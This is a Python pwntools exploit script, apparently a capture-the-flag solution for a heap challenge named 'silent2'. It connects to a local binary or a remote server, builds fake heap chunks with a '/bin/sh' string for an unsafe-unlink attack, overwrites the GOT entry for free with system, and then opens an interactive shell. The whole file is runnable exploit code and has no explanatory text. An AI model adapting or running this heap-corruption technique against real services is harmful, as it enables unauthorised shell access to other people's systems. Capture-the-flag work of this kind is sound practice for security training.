#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
#os.environ["LD_LIBRARY_PATH"]="/dbg64/lib"
pwn_file="./silent2"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("39.107.32.132",10001)
#    conn=remote("cc",4444)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add(size,content):
    conn.sendline("1")
    sleep(0.1)
    conn.send("\n")
    sleep(0.1)
    conn.send(str(size))
    sleep(0.1)
    conn.send("\n")
    sleep(0.1)
    conn.send(content)
    sleep(0.1)

def edit(index,content,junk):
    conn.sendline("3")
    sleep(0.1)
    conn.send("\n")
    sleep(0.1)
    conn.send(str(index))
    sleep(0.1)
    conn.send("\n")
    sleep(0.1)
    conn.send(content)
    sleep(0.1)
    conn.send(junk)
    sleep(0.1)

def dele(index):
    conn.sendline("2")
    sleep(0.1)
    conn.send("\n")
    sleep(0.1)
    conn.send(str(index))
    sleep(0.1)
    conn.send("\n")

conn.recv()
add(0x100,"a"*0x20)#0
add(0x100,"a"*0x20)#1
add(0x100,"a"*0x20)#2
add(0x100,"a"*0x20)#3
add(0x100,"a"*0x20)#4
dele(2)
dele(3)
dele(4)
add(0x200,"a"*0x20)#5
add(0x200,"a"*0x20)#6
add(0x10,"a")#7
dele(5)
dele(6)
f={
    0:"/bin/sh\x00",
    0x110:p64(0),
    0x118:p64(0x101),
    0x120:p64(0x6020d0-0x10),
    0x128:p64(0x6020d0-0x8),
    0x210:p64(0x100),
    0x218:p64(0x110),
    0x320:p64(0),
    0x328:p64(0x21),
    0x340:p64(0),
    0x348:p64(0x21),
}
payload=fit(f,filler="a")
add(0x410,payload)
dele(4)
edit(3,p64(elf.got["free"])[:4],"a")
edit(0,p64(elf.symbols["system"])[:6],"a")
dele(8)
conn.sendline("ls")
conn.interactive()



